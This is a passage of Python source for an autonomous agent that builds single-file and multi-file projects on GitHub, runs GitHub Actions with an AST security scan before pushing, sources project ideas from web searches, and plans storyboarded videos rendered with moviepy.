            previous_run_id = previous_run.get("id") if previous_run is not None else None
            triggered, msg = trigger_github_workflow(existing["repo_name"], "run.yml")
            if triggered:
                run = wait_for_run_completion(existing["repo_name"], previous_run_id=previous_run_id)
                if run and run.get("id") != previous_run_id and run.get("conclusion") == "success":
                    update_tool_trust(existing["id"], True)
                    return ("Reused tool " + existing["id"] + " (originally built for: \"" + existing.get("idea", "") +
                            "\"): https://github.com/" + username + "/" + existing["repo_name"] +
                            "\nIf that's not actually what you asked for, add \"!!\" to your request to force a fresh build.")
            update_tool_trust(existing["id"], False)
            if not is_tool_trustworthy(existing):
                retire_tool(existing)
            print("Existing tool failed, rebuilding...")

    print("Building: " + idea)
    # BUG FIX: hold _github_code_file_lock for the whole build+retry cycle —
    # see the lock's definition above for the full race description.
    with _github_code_file_lock:
        write_code_for_github(idea)
        injected_url = None
        injected_key = None

        for attempt in range(1, MAX_GITHUB_ATTEMPTS + 1):
            print("--- Attempt " + str(attempt) + " ---")

            # Security gate — this path used to push straight to GitHub Actions
            # CI (running with that repo's GITHUB_TOKEN-scoped permissions)
            # with no scan at all. Every other build path runs check_security()
            # before executing/publishing generated code; this one didn't.
            sec_passed, sec_reason = check_security(read_file(GITHUB_CODE_FILE))
            if not sec_passed:
                output = "Blocked before pushing to GitHub by security scan (AST): " + sec_reason
                print(output)
            else:
                success, output = validate_python_on_github(repo_name)
                if success:
                    tool_id = register_github_tool(idea, repo_name)
                    username = get_github_username()
                    return "Working version pushed after " + str(attempt) + " attempt(s) as " + tool_id + ": https://github.com/" + username + "/" + repo_name
                print("Failed:\n" + output)

            if is_api_key_error(output) or is_missing_secret_error(output):
                print("Detected API key issue — attempting auto-resolution via GitHub Actions browser...")
                new_url, new_key, fallback_msg = handle_api_key_error(output, idea)
                if fallback_msg:
                    return fallback_msg
                if new_url:
                    injected_url = new_url
                if new_key:
                    injected_key = new_key

            category = categorize_failure(output)
            lesson = reflect_on_failure(idea, output)
            maybe_create_precheck(category, lesson or "")
            if lesson:
                print("Learned: " + lesson)

            if attempt < MAX_GITHUB_ATTEMPTS:
                write_code_for_github(idea, previous_error=output, injected_url=injected_url, injected_key=injected_key)
            else:
                return "Could not build after " + str(MAX_GITHUB_ATTEMPTS) + " attempts. Last error:\n" + output
        return "Unexpected end of retry loop."

# ============================================================
# MULTI-FILE GITHUB PROJECT BUILDER
# ============================================================
# build_and_fix_on_github() above only ever produces ONE Python file
# tested via GitHub Actions — it has no concept of multi-file projects
# (e.g. an index.html + supporting files, served via GitHub Pages).
# When a spec needs more than one file, that gap left the agent with no
# command that actually executes the build — it would fall through to
# free-form chat and could describe steps instead of running them. This
# function closes that gap: every step below is a real, executed call
# (repo creation, per-file generation + push, Pages enable), and it
# verifies the result with a fresh GET before claiming success — it
# never reports "done" based on assumption alone.

def repo_exists(username, repo_name):
    """Returns True if repo_name already exists under username, False otherwise (including on network error — safer to assume 'taken' and pick a new name than to collide)."""
    try:
        response = requests.get(
            "https://api.github.com/repos/" + username + "/" + repo_name,
            headers=github_headers(), timeout=15
        )
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return True

def get_available_repo_name(base_name, username):
    """
    Returns base_name if free, otherwise base_name-2, base_name-3, ...
    up to a reasonable cap. Prevents the silent failure mode where a
    repo name collision (e.g. the AI picks a common name like
    'agent-city') would otherwise cause create_github_repo() to fail
    with no automatic recovery.
    """
    candidate = base_name
    suffix = 2
    while repo_exists(username, candidate) and suffix <= 20:
        candidate = base_name + "-" + str(suffix)
        suffix += 1
    return candidate

def check_local_references(file_contents):
    """
    Catches the exact bug class where build_multifile_project_on_github()
    generates files in isolation: a script fetching a data file nothing
    else generated, or a stylesheet pushed but never linked. Best-effort
    regex scan, run after all files exist, so the gap shows up in the
    build summary instead of as a silent blank/frozen page later.
    """
    filenames = set(file_contents.keys())
    warnings = []
    local_ref = re.compile(r'(?:fetch\(|src=|href=)[\'"]([^\'"]+)[\'"]')
    referenced = set()
    for path, content in file_contents.items():
        for match in local_ref.finditer(content):
            ref = match.group(1)
            if ref.startswith(("http://", "https://", "//", "#", "data:")):
                continue
            ref = ref.lstrip("./").split("?")[0].split("#")[0]
            if not ref:
                continue
            referenced.add(ref)
            if ref not in filenames:
                warnings.append(path + " references '" + ref + "' but that file was never generated")
    for path in filenames:
        if path in ("index.html", "README.md", ".gitignore", "package.json"):
            continue
        if path not in referenced:
            warnings.append(path + " was generated but nothing else references it — likely dead weight")
    return warnings

def build_multifile_project_on_github(spec, repo_name, skip_clarify=False):
    """
    Builds a multi-file project end-to-end via real GitHub API calls:
    1) picks a free repo name (auto-suffixing on collision) and creates
    it, 2) asks the AI for a minimal file manifest (retrying once on
    malformed JSON), 3) generates and pushes each file for real
    (retrying once per file on a failed AI generation), 4) enables
    GitHub Pages if an index.html was produced, 5) re-fetches the repo
    contents to verify what's actually there instead of trusting
    earlier responses. Returns a plain-text summary — including any
    per-file failures — rather than a bare success/fail flag, so a
    caller (or the console) can see exactly what did and didn't land.
    """
    if not skip_clarify:
        answer = ask_clarifying_questions(spec)
        if answer:
            spec = spec + "\n\nAdditional requirements from the user: " + answer

    username = get_github_username()
    if not username:
        return "ERROR: could not determine GitHub username — check GITHUB_TOKEN."

    original_requested_name = repo_name
    repo_name = get_available_repo_name(repo_name, username)
    if repo_name != original_requested_name:
        print("'" + original_requested_name + "' already exists — using '" + repo_name + "' instead.")

    print("Creating repo: " + repo_name)
    create_result = create_github_repo(repo_name, description=spec[:350], private=False)
    print(create_result)
    if create_result.startswith("Could not create repo") or create_result.startswith("ERROR"):
        return create_result  # stop here — no point generating files for a repo that doesn't exist

    manifest_prompt = (
        "You are generating a file manifest for a multi-file software project based on this spec:\n\n"
        + spec +
        "\n\nRespond with ONLY a JSON array of file paths that should exist in the repo root "
        "(for example: [\"index.html\", \"README.md\"]). No explanation, no markdown fences, "
        "just the JSON array. Keep it to the minimum files actually needed to satisfy the spec."
    )

    def parse_manifest(raw):
        cleaned = raw.strip()
        if cleaned.startswith("```"):
            cleaned = cleaned.strip("`")
            cleaned = cleaned[cleaned.find("["):cleaned.rfind("]") + 1]
        parsed = json.loads(cleaned)
        if not isinstance(parsed, list) or not parsed:
            raise ValueError("empty or non-list manifest")
        return parsed

    file_list = None
    for attempt_prompt in (manifest_prompt, manifest_prompt + "\n\nSTRICT: your entire response must be valid JSON — nothing else."):
        try:
            file_list = parse_manifest(ask_ai(attempt_prompt))
            break
        except Exception:
            continue
    if file_list is None:
        file_list = ["index.html"]  # safe fallback — ship at least something rather than nothing
        print("Manifest generation failed twice — falling back to a single index.html.")

    MAX_MANIFEST_FILES = 30  # guard against a runaway/hallucinated manifest hammering the GitHub API
    if len(file_list) > MAX_MANIFEST_FILES:
        print("Manifest listed " + str(len(file_list)) + " files — capping to first " + str(MAX_MANIFEST_FILES) + ".")
        file_list = file_list[:MAX_MANIFEST_FILES]

    MIN_CONTENT_LENGTH = 20  # a real file is essentially never shorter than this — catches silent near-empty AI output

    pushed_files = []
    failed_files = []
    file_contents = {}
    total = len(file_list)

    for i, raw_path in enumerate(file_list):
        file_path = str(raw_path).strip().lstrip("/")
        if not file_path:
            continue
        print("(" + str(i + 1) + "/" + str(total) + ") generating " + file_path + "...")
        gen_prompt = (
            "Generate the COMPLETE content for the file '" + file_path + "' as part of this project:\n\n"
            + spec +
            "\n\nThe full set of files in this project is: " + ", ".join(str(p) for p in file_list) +
            ". If this file needs to reference, import, fetch, or link any of those other files, use "
            "their exact names — never reference a file that isn't in that list. If this file loads "
            "external resources (CDN scripts/modules, web fonts, remote APIs), wrap that loading in "
            "error handling that replaces any on-screen loading indicator with the actual error message "
            "on failure — never leave a page silently stuck on a loading state.\n"
            "\n\nOutput ONLY the raw file content — no markdown code fences, no explanation, no commentary."
        )

        content = ask_ai(gen_prompt)
        if content.startswith("ERROR") or len(content.strip()) < MIN_CONTENT_LENGTH:
            print("Retrying generation for " + file_path + " — got too little content or an error.")
            content = ask_ai(gen_prompt)  # one retry — AI calls occasionally hit transient rate limits/timeouts/empty responses
        if content.startswith("ERROR"):
            failed_files.append(file_path + ": " + content)
            continue
        if len(content.strip()) < MIN_CONTENT_LENGTH:
            failed_files.append(file_path + ": generated content suspiciously short (" + str(len(content.strip())) + " chars) — skipped rather than pushing something broken")
            continue

        # AST security scan only applies to actual Python — running it on
        # HTML/JS/CSS/etc. would false-positive, so it's gated by extension.
        if file_path.endswith(".py"):
            sec_passed, sec_reason = check_security(content)
            if not sec_passed:
                failed_files.append(file_path + ": blocked by security scan — " + sec_reason)
                continue

        result = create_github_file(repo_name, file_path, content, commit_message="Add " + file_path)
        print(result)
        if result.startswith("Could not create file") or result.startswith("ERROR"):
            failed_files.append(file_path + ": " + result)
        else:
            pushed_files.append(file_path)
            file_contents[file_path] = content
        if i < total - 1:
            time.sleep(0.5)  # small gap between pushes — avoids GitHub's secondary rate limit on rapid writes

    pages_result = ""
    if "index.html" in pushed_files:
        pages_result = ensure_github_pages_enabled(repo_name)
        print(pages_result)

    # Track this build in the same tools index every other build path uses,
    # so it shows up in 'how many tools' / selftest / whathappened like
    # anything else the agent builds — previously this path was invisible
    # to the rest of the system's bookkeeping.
    tool_id = None
    if pushed_files:
        tool_id = register_github_tool(spec[:200], repo_name)
        print("Registered as tool: " + tool_id)

    # Real verification — re-fetch the repo root instead of trusting the
    # per-file 200/201 responses collected above.
    verified_files = []
    try:
        verify = requests.get(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/contents/",
            headers=github_headers(), timeout=20
        )
        if verify.status_code == 200:
            verify_data = _github_json(verify)
            if isinstance(verify_data, list):
                verified_files = [item["name"] for item in verify_data if item.get("type") == "file"]
    except requests.exceptions.RequestException:
        pass  # verification failed to reach GitHub — report what we have below regardless

    summary_lines = [
        "Repo: https://github.com/" + username + "/" + repo_name,
        "Files pushed (" + str(len(pushed_files)) + "): " + (", ".join(pushed_files) if pushed_files else "none"),
    ]
    if failed_files:
        summary_lines.append("Failed (" + str(len(failed_files)) + "): " + "; ".join(failed_files))
    reference_warnings = check_local_references(file_contents)
    if reference_warnings:
        summary_lines.append(
            "Reference check found " + str(len(reference_warnings)) + " issue(s) — likely to break at "
            "runtime despite every file pushing cleanly: " + "; ".join(reference_warnings)
        )
    if pages_result:
        summary_lines.append("Pages: " + pages_result)
    if tool_id:
        summary_lines.append("Tracked as: " + tool_id)
    summary_lines.append(
        "Verified via GitHub API — files actually present in repo root right now: "
        + (", ".join(verified_files) if verified_files else "NONE FOUND")
    )
    if "index.html" in pushed_files:
        summary_lines.append(
            "Live URL (Pages can take a minute to deploy after enabling): "
            "https://" + username + ".github.io/" + repo_name + "/"
        )
    return "\n".join(summary_lines)

# ============================================================
# COMBATT — AUTONOMOUS IDEA-TO-PROJECT BUILDER
# ============================================================
# Ties the website lane (build_and_fix_web_workflow) and the general
# multi-file GitHub lane (build_multifile_project_on_github) together
# behind one command: 'combatt'. Sources a real, currently-relevant idea
# from a live web search (not invented from nothing), decides which of
# the two lanes actually fits it, and runs that build end-to-end with
# no further input required. 'combatt: <idea>' skips the sourcing step
# and builds a specific idea instead.

COMBATT_IDEA_QUERIES = [
    "innovative website ideas trending",
    "successful small SaaS product ideas",
    "trending app ideas this year",
    "profitable micro startup ideas",
    "viral website concepts",
    "useful web tool ideas people want",
]
_combatt_idea_query_index = [0]

def scan_web_for_real_project_idea():
    """
    Sibling of scan_web_for_tool_idea(), but aimed at real, build-worthy
    WEBSITE/PROJECT ideas rather than small utility scripts. Pulls fresh
    web search results on a rotating topic and asks the AI to distill ONE
    concrete idea with enough detail to start building immediately.
    Returns an idea string, or None if nothing usable came back — the
    caller is expected to retry a couple of times on a rotating query
    before giving up, same pattern as the dreamer's own idea sourcing.
    """
    query = COMBATT_IDEA_QUERIES[_combatt_idea_query_index[0] % len(COMBATT_IDEA_QUERIES)]
    _combatt_idea_query_index[0] += 1
    results = search_web(query)
    if (not results or results.startswith("ERROR")
            or results.startswith("Web search failed") or results.startswith("No web results")):
        return None

    prompt = (
        "Here are some current web search results:\n" + results +
        "\n\nBased on these results, suggest ONE concrete, real, buildable project idea — "
        "either a full website (marketing site, tool, or browser game) or a broader software "
        "project. Describe it in 2-4 sentences with enough detail that someone could start "
        "building it immediately (what it does, who it's for, key features). "
        "Reply with ONLY the idea description, or reply NONE if nothing usable stands out."
    )
    idea = ask_ai(prompt).strip()
    if not idea or idea.upper().startswith("NONE"):
        return None
    return idea

def choose_build_lane(idea):
    """
    Classifies whether `idea` is best built as a WEBSITE (routed to the
    existing, more battle-tested web lane — SEO/branding/QA included) or
    as a broader multi-file software PROJECT (routed to the general
    GitHub multi-file builder). Defaults to 'website' on an unclear or
    failed classification, since that lane has the most safeguards.
    """
    prompt = (
        "Is the following project idea best built as a WEBSITE (a marketing site, "
        "landing page, web app UI, or browser game) or as a broader software PROJECT "
        "(something involving backend logic, CLI tools, config files, or non-website "
        "code as the main deliverable)?\nReply with ONLY: WEBSITE or PROJECT\n\nIdea: " + idea
    )
    result = ask_ai(prompt).strip().upper()
    return "project" if "PROJECT" in result else "website"

def combatt_auto_build(idea_override=None):
    """
    The 'combatt' command. Sources a real, currently-relevant idea from
    the live web (unless idea_override is given), classifies which lane
    fits it, and runs that build end-to-end. Returns the underlying
    builder's own plain-text summary — failures stay visible rather than
    being collapsed into a generic success/fail flag.
    """
    if idea_override and idea_override.strip():
        idea = idea_override.strip()
        print("Using provided idea: " + idea)
    else:
        print("Sourcing a real idea from the web...")
        idea = None
        for _ in range(3):  # try a few rotating queries before giving up
            idea = scan_web_for_real_project_idea()
            if idea:
                break
        if not idea:
            return "Could not source a usable idea from the web after several tries. Try 'combatt: <your idea>' to supply one directly."
        print("Idea: " + idea)

    answer = ask_clarifying_questions(idea)
    if answer:
        idea = idea + "\n\nAdditional requirements from the user: " + answer

    lane = choose_build_lane(idea)
    print("Routing to the " + lane + " lane.")

    if lane == "website":
        return build_and_fix_web_workflow(idea, skip_clarify=True)

    name_prompt = (
        "Extract or invent a short, valid GitHub repo name (lowercase, "
        "letters/numbers/hyphens only, no spaces) for this project idea. "
        "Respond with ONLY the repo name, nothing else:\n\n" + idea
    )
    suggested_repo = ask_ai(name_prompt).strip().splitlines()[0].strip()
    suggested_repo = re.sub(r"[^a-zA-Z0-9._-]", "-", suggested_repo)[:80] or "new-project"
    return build_multifile_project_on_github(idea, suggested_repo, skip_clarify=True)

# ============================================================
# VIDEO BUILD LANE
# Real video editing needs ffmpeg, real CPU time, and real memory — far
# more than the local sandbox (run_sandboxed_python: 20s CPU / 256MB RAM)
# allows. GitHub-hosted ubuntu-22.04 Actions runners ship with ffmpeg
# preinstalled and give ~7GB RAM / hours of runtime, so this lane reuses
# the same "push code, trigger a workflow, wait for it" pattern as the
# GITHUB BUILD WORKFLOW above, but adds a commit-back step so the actual
# rendered video file ends up in the repo (and therefore has a stable,
# shareable raw.githubusercontent.com download/streaming URL) instead of
# being thrown away when the runner shuts down.
# ============================================================

VIDEO_REPO_NAME = "agent-video-tools"
VIDEO_CODE_FILE = workpath("video_job.py")
VIDEO_REQUIREMENTS_FILE = workpath("video_requirements.txt")
# BUG FIX: same shared-scratch-file race as GENERATED_CODE_FILE /
# GITHUB_CODE_FILE (see their lock definitions above) — build_and_fix_video_workflow()
# writes and repeatedly re-reads VIDEO_CODE_FILE across a retry loop that
# includes a GitHub Actions render wait of up to 600 seconds. Two concurrent
# video builds would otherwise silently overwrite each other's video_job.py
# mid-build, causing the wrong script to get validated/pushed/registered.
_video_code_file_lock = threading.Lock()
MAX_VIDEO_ATTEMPTS = 3
VIDEO_OUTPUT_FILENAME = "output.mp4"  # the generated script MUST write its result here

def _parse_json_loose(text):
    """
    Best-effort JSON extraction from an LLM reply: strips code fences, then
    if the whole string still isn't valid JSON, falls back to slicing from
    the first '{' to the last '}' (models sometimes wrap JSON in a sentence
    of preamble/commentary despite instructions not to). Returns None on
    total failure so callers can fall back gracefully instead of crashing.
    """
    cleaned = strip_fences(text.strip())
    try:
        return json.loads(cleaned)
    except (json.JSONDecodeError, ValueError):
        pass
    start, end = cleaned.find("{"), cleaned.rfind("}")
    if start != -1 and end != -1 and end > start:
        try:
            return json.loads(cleaned[start:end + 1])
        except (json.JSONDecodeError, ValueError):
            return None
    return None

def plan_video_storyboard(idea, previous_feedback=""):
    """
    Pre-production pass, run BEFORE any code is written. Rather than
    leaving pacing, captions, narration and visual sourcing to whatever a
    single code-generation pass improvises, this asks the model to act as
    a director/editor and commit to a concrete scene-by-scene plan first —
    the same way a real short-form video actually gets made. The plan then
    drives both asset generation (generate_video_scene_assets) and the
    code-gen prompt (write_code_for_video), so the eventual script is
    executing a spec instead of inventing one on the fly.
    Returns a dict, or None if planning fails entirely (callers must treat
    None as "fall back to the old unplanned flow" so a planning hiccup
    never blocks a video from being built at all).
    """
    feedback_block = ("\n\nThe previous storyboard produced a script that failed review/QA for this "
        "reason, take it into account: " + previous_feedback) if previous_feedback else ""
    prompt = """You are directing a short social/promo video for this request: """ + idea + """

Produce a concrete scene-by-scene storyboard as JSON only (no commentary, no markdown fences). Schema:
{
  "aspect_ratio": "16:9" | "9:16" | "1:1",
  "width": <int>, "height": <int>,
  "output_formats": [<list of other aspect ratios, from "16:9"/"9:16"/"1:1", to ALSO auto-export as separate files for cross-platform posting — empty list if only the primary aspect_ratio is needed>],
  "use_narration": true | false,
  "narration_voice": "<short voice descriptor, e.g. 'calm confident female' or 'energetic upbeat male', or empty if use_narration is false>",
  "target_languages": [<list of ISO 639-1 codes, e.g. "es","fr", for ADDITIONAL dubbed versions with translated narration over the same visuals — empty list unless the idea explicitly asks for multiple languages/dubbing/translation>],
  "music_mood": "<short mood/genre description for background music, or 'none' if the idea is explicitly silent>",
  "watermark_text": "<short brand/handle text to place as a subtle watermark in a corner for the whole video, or empty string if none requested>",
  "scenes": [
    {
      "index": 0,
      "description": "<what's visually on screen>",
      "duration_seconds": <number, 2-6 typically>,
      "visual_source": "generated_image" | "synthetic" | "source_footage",
      "image_prompt": "<a vivid, specific prompt for an AI image model to generate this scene's background art/photo — required if visual_source is generated_image, describe subject, style, lighting, composition like briefing a photographer/illustrator>",
      "source_url": "<direct URL of existing footage to edit — required if visual_source is source_footage, taken from the idea>",
      "trim_start": <seconds into source_url to start the subclip — only used if visual_source is source_footage, default 0>,
      "trim_end": <seconds into source_url to end the subclip, or null to mean 'trim_start + duration_seconds' — only used if visual_source is source_footage>,
      "speed": <playback speed multiplier for this scene, 1.0 normal, less than 1 for slow-motion, greater than 1 for a timelapse/fast feel — only meaningful for source_footage or when the idea calls for a speed effect>,
      "color_grade": "<short grading direction for this scene, e.g. 'warm cinematic', 'moody desaturated', 'vibrant punchy', or 'none'>",
      "transition_in": "crossfade" | "fade_black" | "wipe_left" | "wipe_right" | "zoom_in" | "slide_up" | "cut",
      "caption_text": "<on-screen caption/title for this scene, or empty string if none>",
      "caption_style": "bold_centered_karaoke" | "clean_lower_third" | "minimal_top" | "none",
      "narration_line": "<what a voiceover says during this scene, or empty string if use_narration is false or this scene is silent>"
    }
  ]
}
Guidance:
- Use "generated_image" for scenes that need real photographic/illustrated backing art (product shots, portraits, scenery, abstract brand visuals). Use "synthetic" for scenes genuinely better as clean typography/motion graphics (a title card, a stat callout, a color-field transition beat). Use "source_footage" whenever the idea references or provides an existing video by URL to trim/cut/speed-up/color-grade — set source_url/trim_start/trim_end on those scenes and leave image_prompt empty.
- Set use_narration true whenever a voice explaining/narrating would suit the idea (explainers, promos, stories) — silence reads as unfinished more often than not. Keep narration_line short and natural to speak aloud (roughly 2-3 spoken words per second of duration_seconds). Pick narration_voice to match the idea's tone.
- Only populate target_languages if the idea explicitly asks for translation/dubbing/multiple languages — otherwise leave it an empty list, this is extra render time and shouldn't be assumed.
- Only populate output_formats with formats OTHER than the primary aspect_ratio, and only when the idea implies cross-posting/repurposing (e.g. "also make it a reel", "for every platform") — otherwise leave it empty.
- caption_style: use "bold_centered_karaoke" (word-by-word highlight synced to narration) when narration drives the pacing, "clean_lower_third" for calm explainer/interview-style captions, "minimal_top" for a simple title/label, "none" when a scene has no caption_text.
- transition_in should vary with pacing/energy rather than defaulting to the same cut every time — "cut" is valid and often correct for high-energy sequences, but most scenes should get a deliberate transition.
- 3-6 scenes total, whole video well under 30 seconds (dubbed language versions reuse the same scene count/visuals).
- Pick aspect_ratio/width/height to match the idea (16:9 1280x720 general/YouTube, 9:16 720x1280 shorts/reels, 1:1 720x720 square) — default 16:9 1280x720 with no signal either way.
Reply with ONLY the JSON object.""" + feedback_block

    response = ask_ai(prompt)
    retry_count = 0
    while response.startswith("ERROR") and retry_count < 2:
        time.sleep(5)
        response = ask_ai(prompt)
        retry_count += 1
    storyboard = _parse_json_loose(response)
    if not isinstance(storyboard, dict) or not storyboard.get("scenes"):
        return None
    return storyboard

def generate_video_scene_assets(storyboard, repo_name):
    """
    Realizes every "generated_image" scene in the storyboard as an actual
    Gemini-generated image, pushed into the video repo under assets/ so
    the GitHub Actions runner has it sitting on disk (via actions/checkout)
    before video_job.py ever runs — mirrors the website builder's
    genimage: -> real-file pattern, just resolved up front here instead of
    via a placeholder swap. Mutates storyboard scenes in place, adding
    "asset_path" (repo-relative path) on success. On any failure for a
    given scene (no GEMINI_API_KEY, rate limit, upload error) that scene
    is silently downgraded to visual_source "synthetic" so the code-gen
    model draws it itself instead — a Gemini outage should degrade
    quality, never block the whole video.
    """
    aspect_ratio = storyboard.get("aspect_ratio", "16:9")
    image_scenes = [s for s in storyboard.get("scenes", []) if s.get("visual_source") == "generated_image"]
    if not image_scenes:
        return storyboard
    print(create_github_repo(repo_name, description="Video jobs rendered by my agent"))
    for scene in image_scenes:
        prompt = scene.get("image_prompt", "").strip()
        if not prompt:
            scene["visual_source"] = "synthetic"
            continue
        image_bytes, mime_or_err = ask_gemini_image(prompt, aspect_ratio=aspect_ratio)
        if not image_bytes:
            print("Scene " + str(scene.get("index")) + " image generation failed (" + str(mime_or_err) + ") — falling back to synthetic visuals for this scene.")
            scene["visual_source"] = "synthetic"
            continue
        ext = "png" if "png" in str(mime_or_err) else "jpg"
        asset_path = "assets/scene_" + str(scene.get("index")) + "." + ext
        ok, result = create_github_file_binary(repo_name, asset_path, image_bytes, "Add scene asset " + asset_path)
        if ok:
            scene["asset_path"] = asset_path
        else:
            print("Scene " + str(scene.get("index")) + " asset upload failed (" + str(result) + ") — falling back to synthetic visuals for this scene.")
            scene["visual_source"] = "synthetic"
    return storyboard

def _storyboard_prompt_block(storyboard):
    if not storyboard:
        return ""
    lines = ["STORYBOARD (already planned and, where noted, already generated — execute this plan, don't invent your own scenes/pacing):",
             "Aspect ratio: " + str(storyboard.get("aspect_ratio", "16:9")) + " (" + str(storyboard.get("width", 1280)) + "x" + str(storyboard.get("height", 720)) + ")",
             "Music mood/genre: " + str(storyboard.get("music_mood", "none"))]

    output_formats = [f for f in storyboard.get("output_formats", []) if f and f != storyboard.get("aspect_ratio")]
    if output_formats:
        dims = {"16:9": (1280, 720), "9:16": (720, 1280), "1:1": (720, 720)}
        fmt_lines = []
        for fmt in output_formats:
            w, h = dims.get(fmt, (1280, 720))
            tag = fmt.replace(":", "x")
            fmt_lines.append(fmt + " (" + str(w) + "x" + str(h) + ") -> write additionally as \"output_" + tag + ".mp4\"")
        lines.append("MULTI-FORMAT EXPORT REQUIRED in addition to the primary output.mp4: " + "; ".join(fmt_lines) +
                      ". Reframe (crop-to-fill on the dominant subject, don't just squash/stretch) each scene's same visuals/timing/audio into every extra format and write each with its own write_videofile call using that exact filename.")

    watermark_text = str(storyboard.get("watermark_text", "")).strip()
    if watermark_text:
        lines.append("WATERMARK REQUIRED: overlay the text \"" + watermark_text + "\" as a small, low-opacity (~50-60%) TextClip in the bottom-right corner (with a safe margin from the edge) for the FULL duration of every output file, including every multi-format/dubbed export.")

    uses_narration = bool(storyboard.get("use_narration"))
    if uses_narration:
        voice_desc = str(storyboard.get("narration_voice", "")).strip() or "clear, natural"
        lines.append("Narration: REQUIRED, voice character: \"" + voice_desc + "\". Prefer the \"edge-tts\" pip package for higher-quality, more natural voices with real gender/tone variety (it's async: use `import edge_tts, asyncio` then `asyncio.run(edge_tts.Communicate(text, voice=\"en-US-AriaNeural\" or another matching voice).save(path))`); pick a voice whose name/gender/style best matches the voice character above. If edge-tts is unavailable/fails at runtime, catch the exception and fall back to \"gtts\" (from gtts import gTTS; gTTS(text=..., lang='en').save(path)) so the render never blocks on one TTS provider. Do this at the top of the script before building clips. Load each narration file with AudioFileClip, measure its REAL duration, and use that (not the storyboard's rough duration_seconds) as the actual on-screen time for that scene so captions/visuals stay in sync with what's actually being said. Duck/level narration and music together per the base rules.")

    target_languages = storyboard.get("target_languages", [])
    if target_languages:
        lines.append("MULTI-LANGUAGE DUBBING REQUIRED for: " + ", ".join(target_languages) + ". For each language code: translate every narration_line into that language (a short, natural spoken translation — do this translation directly in the script's own text, hardcoded per language, since no other translation service is available), synthesize narration in that language (edge-tts supports many locales, e.g. es-ES/es-MX for Spanish, fr-FR for French — pick an appropriate locale/voice; gtts also accepts a matching lang= code as fallback), reuse the EXACT SAME visuals/timing/music as the primary render, and write the result as \"output_<langcode>.mp4\" (e.g. output_es.mp4). This means the full clip-assembly logic should be a reusable function called once per language plus once for the primary/English version.")

    for scene in storyboard.get("scenes", []):
        idx = scene.get("index")
        desc = "Scene " + str(idx) + ": " + scene.get("description", "") + " | duration ~" + str(scene.get("duration_seconds", "?")) + "s"
        visual_source = scene.get("visual_source", "synthetic")
        if scene.get("asset_path"):
            desc += (" | visual: ALREADY GENERATED, load the real image from \"" + scene["asset_path"] +
                      "\" (relative to the script's working directory — it's already on disk from the repo checkout, do NOT call any image-generation or download code for this scene) and apply a subtle Ken Burns pan/zoom on it")
        elif visual_source == "source_footage" and scene.get("source_url"):
            trim_start = scene.get("trim_start", 0) or 0
            trim_end = scene.get("trim_end")
            trim_desc = "from " + str(trim_start) + "s"
            trim_desc += (" to " + str(trim_end) + "s") if trim_end is not None else (" for ~" + str(scene.get("duration_seconds", 3)) + "s")
            desc += (" | visual: REAL FOOTAGE — download \"" + scene["source_url"] + "\" (requests, stream=True, raise_for_status, chunked write to a local .mp4) if not already downloaded this run, then subclip " + trim_desc)
            speed = scene.get("speed", 1.0) or 1.0
            if abs(float(speed) - 1.0) > 0.01:
                desc += " | speed: apply speedx(factor=" + str(speed) + ") (" + ("slow-motion" if float(speed) < 1 else "timelapse/fast") + ")"
        else:
            desc += " | visual: build this synthetically (Pillow/ColorClip/TextClip as appropriate) since no pre-generated asset exists for this scene"
        color_grade = str(scene.get("color_grade", "none")).strip()
        if color_grade and color_grade.lower() != "none":
            desc += " | color grade: \"" + color_grade + "\" (apply via moviepy.video.fx colorx/lum_contrast or a manual LUT-style pixel transform to achieve this look)"
        transition = scene.get("transition_in", "crossfade")
        desc += " | transition in: " + transition
        if scene.get("caption_text"):
            style = scene.get("caption_style", "clean_lower_third")
            style_hint = {
                "bold_centered_karaoke": "large bold centered text, current word/phrase highlighted in an accent color in sync with narration timing",
                "clean_lower_third": "lower-third placement, semi-transparent background bar, readable sans-serif",
                "minimal_top": "small clean label pinned near the top, minimal styling",
            }.get(style, "readable, deliberately styled")
            desc += " | caption (" + style + " — " + style_hint + "): \"" + scene["caption_text"] + "\""
        if uses_narration and scene.get("narration_line"):
            desc += " | narration line: \"" + scene["narration_line"] + "\" -> save/load as narration_" + str(idx) + ".mp3"
        lines.append(desc)
    return "\n".join(lines)

def write_code_for_video(idea, previous_error="", storyboard=None):
    lessons = load_lessons()
    lessons_block = ("\n\nLessons learned from past failures:\n" + lessons) if lessons else ""
    storyboard_block = _storyboard_prompt_block(storyboard)

    base_rules = """You are a senior video editor/motion designer producing a polished, professional-feel result (the bar is a well-cut social/promo clip that another editor would watch and say "that was actually cut properly," not a rough first-draft render). Rules:
- IMPORTANT: Do NOT call subprocess, os.system, or os.popen anywhere in this script — those are hard-blocked by an automated security scan before the code is ever run, and the script will be rejected outright. Use the "moviepy" pip package for all video work instead (it wraps ffmpeg internally without your code needing to shell out directly). ffmpeg itself is available as a system binary for moviepy to find.
- If the idea references an existing video by URL, download it first with requests (stream=True, raise_for_status(), write in chunks to a local .mp4) before editing it with moviepy (VideoFileClip, subclip, concatenate_videoclips, CompositeVideoClip, TextClip for captions, etc.).
- If a storyboard is provided below, follow it scene-by-scene — it already specifies durations, captions, narration lines and which scenes have a real pre-generated image asset sitting on disk vs. which need synthetic visuals. Do not regenerate, redownload, or re-imagine visuals for any scene that already has an asset_path.
- If no storyboard is provided and no source video/URL is given or implied, GENERATE visuals from scratch with moviepy — e.g. ColorClip/ImageClip backgrounds, frames drawn with Pillow and assembled via ImageSequenceClip, or TextClip overlays. Prefer subtle motion over a static frame: a slow Ken Burns-style zoom/pan (resize/position keyframed over the clip's duration) on any still image beats a frozen shot. This script must run fully unattended (no input(), no manual steps) — never ask the user for a file, synthesize something reasonable for the idea instead.
- Pacing & structure: when there are multiple clips/scenes, cut on purpose — vary shot length instead of splitting evenly, and let pacing match content (quicker cuts for energy, longer holds for a point that needs to land). Use crossfades or short fade-to-black transitions between scenes (clip.crossfadein/crossfadeout or CompositeVideoClip with staggered start times) instead of hard cuts, unless the idea specifically calls for hard cuts. Open on something that reads as intentional (not a blank/black first frame) and end on a clean fade-out rather than an abrupt stop.
- Color & polish: apply sensible color correction/grading (moviepy.video.fx — e.g. lum_contrast, colorx — or a subtle vignette) rather than leaving raw, flat footage untouched, when it suits the idea.
